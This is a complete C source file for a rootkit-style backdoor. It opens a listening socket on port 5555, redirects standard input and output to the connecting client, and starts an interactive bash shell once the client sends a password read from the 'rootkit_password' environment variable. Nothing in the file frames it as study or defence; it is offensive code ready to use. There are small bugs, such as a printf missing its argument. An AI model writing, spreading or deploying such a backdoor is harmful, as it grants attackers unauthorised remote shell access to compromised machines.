#include <stdio.h>
#include <netinet/in.h>
#include <sys/socket.h>
#include <pthread.h>
#include <unistd.h>
#include <string.h>
#include <stdlib.h>

void *write_pid(void *ptr);

int main(){
	
	pthread_t thread_id;

	struct sockaddr_in server_addr;
	server_addr.sin_family=AF_INET;
	server_addr.sin_addr.s_addr = INADDR_ANY;
	server_addr.sin_port = htons(5555);

	int sockfd = socket(AF_INET, SOCK_STREAM,0);
	if(sockfd == -1){
		printf("Error creating socket.\n");
		return 1;
	}

	int bindfd = bind(sockfd, (struct sockaddr *)&server_addr,sizeof(server_addr));


	listen(sockfd,0);
	pthread_create(&thread_id,NULL,write_pid,NULL);
	pthread_join(thread_id,NULL);
	int acceptfd = accept(sockfd, NULL,NULL);

	for(int i = 0;i<3;i++){
		dup2(acceptfd,i);
	}
	char buf[32];
	const char* passwd=getenv("rootkit_password");
	read(acceptfd,buf,32);
	buf[strcspn(buf,"\n")]=0;

	if(strcmp(buf,passwd)==0){
		execve("/bin/bash",(char *[]){"/bin/bash","-i",NULL},NULL);
        close(sockfd);
	}

}

//TODO
//make this more useful
void *write_pid(void *ptr){
	pid_t pid=getpid();
	printf("PID is: %d\n");
}

